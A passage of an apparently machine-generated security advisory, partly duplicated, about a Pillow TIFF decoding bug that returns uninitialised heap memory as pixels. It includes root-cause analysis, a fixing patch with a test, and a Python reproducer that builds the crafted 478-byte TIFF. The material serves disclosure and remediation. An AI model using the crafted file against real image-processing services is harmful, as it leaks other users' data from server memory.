TIFFs always\ntake the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the\nremaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's\n`MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the\nfresh-`malloc` fill byte), and in a process that has just freed buffers containing\n`b\"LEAK\"` they contain 15872 copies of `LEAK`.\n\nFeeding the same file to libtiff 4.5.0 directly confirms the library side:\n`TIFFReadEncodedStrip(t, 0, buf, 65536)` prints\n`JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`,\nreturns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs\n`TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either.\n\nThe strip path:\n\n```c\n// src/libImaging/TiffDecode.c:552\n    /* realloc to fit whole strip */\n    /* malloc check above */\n    new_data = realloc(state-\u003ebuffer, state-\u003ebytes);      // state-\u003ebytes = TIFFStripSize()\n    …\n    state-\u003ebuffer = new_data;\n\n    for (; state-\u003ey \u003c state-\u003eysize; state-\u003ey += rows_per_strip) {\n        …\n            if (TIFFReadEncodedStrip(\n                    tiff,\n                    TIFFComputeStrip(tiff, state-\u003ey, plane),\n                    (tdata_t)state-\u003ebuffer,\n                    strip_size\n                ) == -1) {\n                … return -1;\n            }\n            …\n            // iterate over each row in the strip and stuff data into image\n            for (strip_row = 0;\n                 strip_row \u003c MIN((INT32)rows_per_strip, state-\u003eysize - state-\u003ey);\n                 strip_row++) {\n                …\n                shuffler(\n                    (UINT8 *)im-\u003eimage[state-\u003ey + state-\u003eyoff + strip_row] +\n                        state-\u003exoff * im-\u003epixelsize,\n                    state-\u003ebuffer + strip_row * row_byte_size,\n                    state-\u003exsize\n                );\n```\n\n`state-\u003ebuffer` arrives here as the one-row `calloc` made by `decode.c:230`\n(`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back\na different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the\nnominal strip size on success, not the number of rows produced, and the only check is\n`== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im-\u003eimage`\n(which itself is zeroed by `core.new`, so the garbage provably comes from `state-\u003ebuffer`).\n`_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then\n`tile_length` rows copied after each `TIFFReadTile()` at 460–488).\n\nFor a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes\nand the copy is correct. The malicious file differs only in the SOF height of the embedded\nJPEG; libtiff treats \"JPEG smaller than strip\" as a warning, clamps the row count to the\nJPEG height, and reports success.\n\nJPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode`\n(`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256\n1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error,\nlibtiff writes 17 rows (1088 bytes) of the 16384-byte buffer\n(`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other\n15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were\nchecked and do return -1 on short data, so Pillow raises `OSError` for those.\n\nThe strip path was introduced in `e91b851fdc1c` (\"Add reading old-JPEG compressed TIFFs\",\n2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()`\n(where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy.\nThe tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02,\nPillow 5.3.0).\n\n## Impact\n\nAny application that opens attacker-supplied images with Pillow in the default\nconfiguration and returns something derived from the pixels (thumbnail, preview, format\nconversion, OCR text) discloses freed heap memory of the worker process to the uploader:\neverything below the rows the embedded JPEG/G4 stream actually encodes, up to\n`ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image\nwithin the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no\nsignal that the image is malformed. What comes back depends on allocator state; in a\nlong-running web worker it is typically recently freed request bodies, other users'\ndecoded image buffers and Python object contents. There is no memory corruption; this is\na read of uninitialised (previously used) heap memory, analogous in effect to an\nout-of-bounds read that lands in pixels.\n\n## Reproducing\n\n`repro` is a short Python script that runs against the installed Pillow build with\ndefault settings: no rebuild, no sanitizer, no files written. It runs twice, once normally\nand once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it\nprints is `BUG` or `OK`.\n\n**Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header\ndeclares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip\n(`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile\nis a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG\nencoder. For each layout the script builds two files:\n\n- **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole\n  64 KiB strip/tile.\n- **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference\n  is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns\n  `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full\n  strip/tile size as success.\n\n**Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just\nbefore `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with\n`b\"LEAK\"`, which leaves freed heap chunks about the size of the buffer that\n`_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts\ncopies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under\n`MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so\nany copy in the image came from freed heap memory. It reports `BUG` if a crafted file\nshows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass.\n\n**Expected output on this tree:**\n\n```\n[normal ] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[normal ] strip crafted     ( 478 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n[normal ] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[normal ] tiled crafted     ( 490 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n[perturb] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[perturb] strip crafted     ( 478 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n[perturb] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n[perturb] tiled crafted     ( 490 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\nBUG\n```\n\n`im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised\nstrip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255\nof the crafted files come back as `\\x00` bytes, with no `LEAK` and no `0x55`, and the\nscript ends with `OK`.\n\nThe `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused\nin 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG\ncodec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that\nends early) goes through the same `_decodeStrip()` copy, and the same fix covers it.\n\n## Suggested fix\n\nThe attached patch zeroes `state-\u003ebuffer` before each libtiff read in both loops of\n`src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before\n`TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are\ndeterministic zeros rather than stale heap:\n\n```diff\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ _decodeTile\n             for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n+                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n                 if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n@@ _decodeStrip\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n+            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n             if (TIFFReadEncodedStrip(\n```\n\nA `memset` per strip/tile (rather than one `calloc` after the size is known) is needed\nbecause the same buffer is reused for every strip, and a short last strip would otherwise\nexpose the previous strip's rows — harmless for disclosure, but the per-read `memset`\nkeeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting\nlibtiff warnings to errors via a warning handler is not a good alternative: both codecs\nonly warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate\nfiles (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()`\ncarries no row count to check against. Initialising the buffer covers every codec.\n`_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG\nfiles do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path).\n\nValid files decode exactly as before; rows a codec does not produce are now black instead\nof garbage, and nothing that previously loaded now fails. The patch also adds\n`test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile,\nwhich builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a\nregression guard for the fixed code rather than a reliable detector of the bug: in a fresh\npytest process the unfixed strip variant can pass because the new heap chunk happens to be\nzero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py`\nand `Tests/test_file_tiff.py` pass and the reproducer prints `OK`.\n\n## The patch\n\nZero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap\n\nApplies to `src/libImaging/TiffDecode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..67bc96329 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase):\n             im.load()\n         assert im.size == (950, 975)\n \n+    @pytest.mark.parametrize(\"tiled\", (False, True))\n+    def test_jpeg_short_strip(self, tiled: bool) -\u003e None:\n+        # The JPEG data in the strip/tile only contains 8 of the 256 rows that\n+        # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist\n+        # and still reports success, so the remaining rows must be cleared\n+        # rather than left as uninitialised memory.\n+        jpeg = io.BytesIO()\n+        Image.new(\"L\", (256, 8), 200).save(jpeg, \"JPEG\")\n+        jpeg_data = jpeg.getvalue()\n+\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[256] = 256  # ImageWidth\n+        ifd[257] = 256  # ImageLength\n+        ifd[258] = 8  # BitsPerSample\n+        ifd[259] = 7  # Compression: JPEG\n+        ifd[262] = 1  # PhotometricInterpretation: BlackIsZero\n+        ifd[277] = 1  # SamplesPerPixel\n+        if tiled:\n+            ifd[322] = 256  # TileWidth\n+            ifd[323] = 256  # TileLength\n+            ifd[324] = 0  # TileOffsets\n+            ifd[325] = len(jpeg_data)  # TileByteCounts\n+            # Point the tile data at the end of the IFD\n+            ifd[324] = 8 + len(ifd.tobytes(8))\n+        else:\n+            ifd[278] = 256  # RowsPerStrip\n+            ifd[STRIPOFFSETS] = 0  # Updated by tobytes() to follow the IFD\n+            ifd[279] = len(jpeg_data)  # StripByteCounts\n+\n+        b = io.BytesIO()\n+        ifd.save(b)\n+        b.write(jpeg_data)\n+\n+        with Image.open(b) as im:\n+            assert im.tile[0][0] == \"libtiff\"\n+            im.load()\n+            assert im.crop((0, 0, 256, 8)).getextrema() == (200, 200)\n+            assert im.crop((0, 8, 256, 256)).getextrema() == (0, 0)\n+\n     def test_orientation(self) -\u003e None:\n         with Image.open(\"Tests/images/g4_orientation_1.tif\") as base_im:\n             for i in range(2, 9):\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..d1d6bfbbb 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -457,6 +457,11 @@ _decodeTile(\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n             for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n+                // Some codecs (e.g. JPEG, Group 4) succeed on a tile that decodes\n+                // to fewer rows than the tile length, leaving the rest of the\n+                // buffer untouched. Clear it so that uninitialised memory is not\n+                // copied into the image.\n+                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n                 if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n                     TRACE((\"Decode Error, Tile at %dx%d\\n\", x, y));\n                     state-\u003eerrcode = IMAGING_CODEC_BROKEN;\n@@ -563,6 +568,11 @@ _decodeStrip(\n         int plane;\n         for (plane = 0; plane \u003c planes; plane++) {\n             ImagingShuffler shuffler = unpackers[plane];\n+            // Some codecs (e.g. JPEG, Group 4) succeed on a strip that decodes\n+            // to fewer rows than RowsPerStrip, leaving the rest of the buffer\n+            // untouched. Clear it so that uninitialised memory is not copied\n+            // into the image.\n+            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n             if (TIFFReadEncodedStrip(\n                     tiff,\n                     TIFFComputeStrip(tiff, state-\u003ey, plane),\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,688 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow TiffDecode.c _decodeStrip/_decodeTile: strip/tile buffer is realloc()ed, never\n# initialised, and copied whole into the image even when libtiff's JPEG codec decoded\n# fewer rows than RowsPerStrip/TileLength.  Two independent signals:\n#  pass 1 (normal heap): seed freed 64 KiB chunks with b\"LEAK\" just before load() and\n#         count copies of LEAK in the decoded pixels (file contains no such bytes);\n#  pass 2 (same script re-run under glibc MALLOC_PERTURB_=170): fresh malloc memory is\n#         0x55, so rows that come back all-0x55 are provably uninitialised heap.\nimport gc, io, os, struct, subprocess, sys\nfrom PIL import Image\nW = H = 256; ROWS = 8\nperturbed = os.environ.get(\"MALLOC_PERTURB_\") == \"170\"\nif not perturbed:\n    print(\"Pillow\", Image.__version__, Image.core.__file__)\n\ndef tiff(jpeg_rows, tiled):\n    j = io.BytesIO(); Image.new(\"L\", (W, jpeg_rows), 200).save(j, \"JPEG\"); j = j.getvalue()\n    tags = [(256,3,1,W), (257,3,1,H), (258,3,1,8), (259,3,1,7), (262,3,1,1), (277,3,1,1)]\n    tags += ([(322,3,1,W), (323,3,1,H), (324,4,1,0), (325,4,1,len(j))] if tiled else\n             [(273,4,1,0), (278,3,1,H), (279,4,1,len(j))])\n    tags.sort(); off = 8 + 2 + 12*len(tags) + 4\n    tags = [(t,ty,c, off if t in (273,324) else v) for t,ty,c,v in tags]\n    ifd = struct.pack(\"\u003cH\", len(tags)) + b\"\".join(struct.pack(\"\u003cHHLL\", *t) for t in tags)\n    return b\"II*\\0\" + struct.pack(\"\u003cL\", 8) + ifd + struct.pack(\"\u003cL\", 0) + j\n\nbug = False\nfor tiled in (False, True):\n    for jpeg_rows, label in ((H, \"well-formed\"), (ROWS, \"crafted\")):\n        data = tiff(jpeg_rows, tiled); assert b\"LEAK\" not in data\n        im = Image.open(io.BytesIO(data)); assert im.tile[0][0] == \"libtiff\"\n        junk = [bytearray(b\"LEAK\" * (W*H//4)) for _ in range(6)]; del junk; gc.collect()\n        im.load()                                   # no exception for either file\n        below = im.tobytes()[W*ROWS:]\n        n55, nleak = below.count(0x55), below.count(b\"LEAK\")\n        print(f\"[{'perturb' if perturbed else 'normal '}] {'tiled' if tiled else 'strip'} \"\n              f\"{label:11s} ({len(data):4d} B) rows {ROWS}-{H-1}: {nleak:5d} x b'LEAK', \"\n              f\"{n55:5d}/{len(below)} == 0x55, head={below[:8]!r}\")\n        if jpeg_rows == ROWS and (nleak \u003e 0 or (perturbed and n55 == len(below))):\n            bug = True\nif not perturbed:\n    r = subprocess.run([sys.executable, sys.argv[0]], env={**os.environ, \"MALLOC_PERTURB_\": \"170\"},\n                       capture_output=True, text=True)\n    lines = r.stdout.rstrip().split(\"\\n\")\n    print(\"\\n\".join(lines[:-1])); sys.stderr.write(r.stderr)\n    bug = bug or lines[-1] == \"BUG\"\nprint(\"BUG\" if bug else \"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112897](https://osv.dev/CVE-2026-112897)**.\n\n## [GHSA-q45j-58j2-45rg](https://osv.dev/GHSA-q45j-58j2-45rg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e TiffDecode returns uninitialized memory as pixels for short JPEG strips\n\u003e Location: src/libImaging/TiffDecode.c:554  in _decodeStrip()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content.\n\u003e \n\u003e The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state-\u003ebuffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early.\n\u003e \n\u003e The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b\"LEAK\"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases.\n\u003e \n\u003e This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c (\"Add reading old-JPEG compressed TIFFs\", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0).\n\u003e \n\u003e ## Details\n\u003e \n\u003e `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip\n\u003e (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and\n\u003e then copies all `RowsPerStrip` rows of that buffer into the image whenever\n\u003e `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the\n\u003e JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist\n\u003e and returns the full strip size. The rows it did not write are whatever the heap held\n\u003e before, and Pillow returns them as pixels.\n\u003e \n\u003e A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`,\n\u003e `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data\n\u003e is a baseline JPEG of 256×**8** pixels (as written by `Image.new(\"L\",(256,8),200).save(…,\"JPEG\")`).\n\u003e `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always\n\u003e take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the\n\u003e remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's\n\u003e `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the\n\u003e fresh-`malloc` fill byte), and in a process that has just freed buffers containing\n\u003e `b\"LEAK\"` they contain 15872 copies of `LEAK`.\n\u003e \n\u003e Feeding the same file to libtiff 4.5.0 directly confirms the library side:\n\u003e `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints\n\u003e `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`,\n\u003e returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs\n\u003e `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either.\n\u003e \n\u003e The strip path:\n\u003e \n\u003e ```c\n\u003e // src/libImaging/TiffDecode.c:552\n\u003e     /* realloc to fit whole strip */\n\u003e     /* malloc check above */\n\u003e     new_data = realloc(state-\u003ebuffer, state-\u003ebytes);      // state-\u003ebytes = TIFFStripSize()\n\u003e     …\n\u003e     state-\u003ebuffer = new_data;\n\u003e \n\u003e     for (; state-\u003ey \u003c state-\u003eysize; state-\u003ey += rows_per_strip) {\n\u003e         …\n\u003e             if (TIFFReadEncodedStrip(\n\u003e                     tiff,\n\u003e                     TIFFComputeStrip(tiff, state-\u003ey, plane),\n\u003e                     (tdata_t)state-\u003ebuffer,\n\u003e                     strip_size\n\u003e                 ) == -1) {\n\u003e                 … return -1;\n\u003e             }\n\u003e             …\n\u003e             // iterate over each row in the strip and stuff data into image\n\u003e             for (strip_row = 0;\n\u003e                  strip_row \u003c MIN((INT32)rows_per_strip, state-\u003eysize - state-\u003ey);\n\u003e                  strip_row++) {\n\u003e                 …\n\u003e                 shuffler(\n\u003e                     (UINT8 *)im-\u003eimage[state-\u003ey + state-\u003eyoff + strip_row] +\n\u003e                         state-\u003exoff * im-\u003epixelsize,\n\u003e                     state-\u003ebuffer + strip_row * row_byte_size,\n\u003e                     state-\u003exsize\n\u003e                 );\n\u003e ```\n\u003e \n\u003e `state-\u003ebuffer` arrives here as the one-row `calloc` made by `decode.c:230`\n\u003e (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back\n\u003e a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the\n\u003e nominal strip size on success, not the number of rows produced, and the only check is\n\u003e `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im-\u003eimage`\n\u003e (which itself is zeroed by `core.new`, so the garbage provably comes from `state-\u003ebuffer`).\n\u003e `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then\n\u003e `tile_length` rows copied after each `TIFFReadTile()` at 460–488).\n\u003e \n\u003e For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes\n\u003e and the copy is correct. The malicious file differs only in the SOF height of the embedded\n\u003e JPEG; libtiff treats \"JPEG smaller than strip\" as a warning, clamps the row count to the\n\u003e JPEG height, and reports success.\n\u003e \n\u003e JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode`\n\u003e (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256\n\u003e 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error,\n\u003e libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer\n\u003e (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other\n\u003e 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were\n\u003e checked and do return -1 on short data, so Pillow raises `OSError` for those.\n\u003e \n\u003e The strip path was introduced in `e91b851fdc1c` (\"Add reading old-JPEG compressed TIFFs\",\n\u003e 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()`\n\u003e (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy.\n\u003e The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02,\n\u003e Pillow 5.3.0).\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any application that opens attacker-supplied images with Pillow in the default\n\u003e configuration and returns something derived from the pixels (thumbnail, preview, format\n\u003e conversion, OCR text) discloses freed heap memory of the worker process to the uploader:\n\u003e everything below the rows the embedded JPEG/G4 stream actually encodes, up to\n\u003e `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image\n\u003e within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no\n\u003e signal that the image is malformed. What comes back depends on allocator state; in a\n\u003e long-running web worker it is typically recently freed request bodies, other users'\n\u003e decoded image buffers and Python object contents. There is no memory corruption; this is\n\u003e a read of uninitialised (previously used) heap memory, analogous in effect to an\n\u003e out-of-bounds read that lands in pixels.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a short Python script that runs against the installed Pillow build with\n\u003e default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally\n\u003e and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it\n\u003e prints is `BUG` or `OK`.\n\u003e \n\u003e **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header\n\u003e declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip\n\u003e (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile\n\u003e is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG\n\u003e encoder. For each layout the script builds two files:\n\u003e \n\u003e - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole\n\u003e   64 KiB strip/tile.\n\u003e - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference\n\u003e   is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns\n\u003e   `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full\n\u003e   strip/tile size as success.\n\u003e \n\u003e **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just\n\u003e before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with\n\u003e `b\"LEAK\"`, which leaves freed heap chunks about the size of the buffer that\n\u003e `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts\n\u003e copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under\n\u003e `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so\n\u003e any copy in the image came from freed heap memory. It reports `BUG` if a crafted file\n\u003e shows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass.\n\u003e \n\u003e **Expected output on this tree:**\n\u003e \n\u003e ```\n\u003e [normal ] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [normal ] strip crafted     ( 478 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n\u003e [normal ] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [normal ] tiled crafted     ( 490 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n\u003e [perturb] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [perturb] strip crafted     ( 478 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n\u003e [perturb] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [perturb] tiled crafted     ( 490 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n\u003e BUG\n\u003e ```\n\u003e \n\u003e `im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised\n\u003e strip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255\n\u003e of the crafted files come back as `\\x00` bytes, with no `LEAK` and no `0x55`, and the\n\u003e script ends with `OK`.\n\u003e \n\u003e The `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused\n\u003e in 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG\n\u003e codec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that\n\u003e ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch zeroes `state-\u003ebuffer` before each libtiff read in both loops of\n\u003e `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before\n\u003e `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are\n\u003e deterministic zeros rather than stale heap:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ _decodeTile\n\u003e              for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n\u003e +                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e                  if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n\u003e @@ _decodeStrip\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e +            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e              if (TIFFReadEncodedStrip(\n\u003e ```\n\u003e \n\u003e A `memset` per strip/tile (rather than one `calloc` after the size 